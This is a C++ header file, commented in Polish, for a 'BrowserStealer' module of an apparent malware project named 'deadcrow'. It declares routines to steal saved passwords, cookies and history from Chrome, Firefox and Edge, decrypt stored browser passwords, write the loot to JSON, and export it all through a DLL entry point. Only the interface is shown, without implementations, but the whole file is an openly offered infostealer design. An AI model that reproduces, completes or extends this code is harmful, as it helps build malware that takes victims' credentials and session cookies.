#pragma once

#include <string>
#include <vector>
#include <functional>
#include <windows.h>

namespace deadcrow {
namespace modules {

class BrowserStealer {
public:
    // Konstruktor
    BrowserStealer();
    
    // Destruktor
    ~BrowserStealer();
    
    // Struktura przechowująca dane logowania
    struct Credential {
        std::string url;
        std::string username;
        std::string password;
        std::string browser;
        std::string timestamp;
    };
    
    // Struktura przechowująca dane cookie
    struct Cookie {
        std::string host;
        std::string name;
        std::string value;
        std::string path;
        std::string expiry;
        bool secure;
        bool httpOnly;
        std::string browser;
    };
    
    // Struktura przechowująca dane historii
    struct HistoryItem {
        std::string url;
        std::string title;
        std::string timestamp;
        int visit_count;
        std::string browser;
    };
    
    // Pobranie danych logowania z przeglądarek
    std::vector<Credential> stealCredentials();
    
    // Pobranie cookies z przeglądarek
    std::vector<Cookie> stealCookies();
    
    // Pobranie historii z przeglądarek
    std::vector<HistoryItem> stealHistory();
    
    // Pobranie wszystkich danych i zapisanie do pliku JSON
    bool stealAllToJson(const std::string& output_path);
    
    // Ustawienie callbacka do raportowania statusu
    void setStatusCallback(std::function<void(const std::string&)> callback);
    
    // Funkcja eksportowana dla DLL
    static BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
    
private:
    // Callback do raportowania statusu
    std::function<void(const std::string&)> status_callback_;
    
    // Raportowanie statusu
    void reportStatus(const std::string& status);
    
    // Pobranie danych z Chrome/Chromium
    std::vector<Credential> stealChromiumCredentials();
    std::vector<Cookie> stealChromiumCookies();
    std::vector<HistoryItem> stealChromiumHistory();
    
    // Pobranie danych z Firefox
    std::vector<Credential> stealFirefoxCredentials();
    std::vector<Cookie> stealFirefoxCookies();
    std::vector<HistoryItem> stealFirefoxHistory();
    
    // Pobranie danych z Edge
    std::vector<Credential> stealEdgeCredentials();
    std::vector<Cookie> stealEdgeCookies();
    std::vector<HistoryItem> stealEdgeHistory();
    
    // Pomocnicze funkcje do deszyfrowania danych
    std::string decryptChromiumPassword(const std::vector<uint8_t>& encrypted_value);
    std::string decryptFirefoxPassword(const std::string& encrypted_value);
    
    // Funkcje do pracy z bazami SQLite
    bool openDatabase(const std::string& path, void** db);
    void closeDatabase(void* db);
    bool executeQuery(void* db, const std::string& query, std::function<void(int, char**, char**)> callback);
    
    // Funkcje do lokalizacji plików przeglądarek
    std::string getChromiumProfilePath();
    std::string getFirefoxProfilePath();
    std::string getEdgeProfilePath();
};

// Funkcje eksportowane dla DLL
extern "C" __declspec(dllexport) const char* StealBrowserData(const char* output_path);

} // namespace modules
} // namespace deadcrow
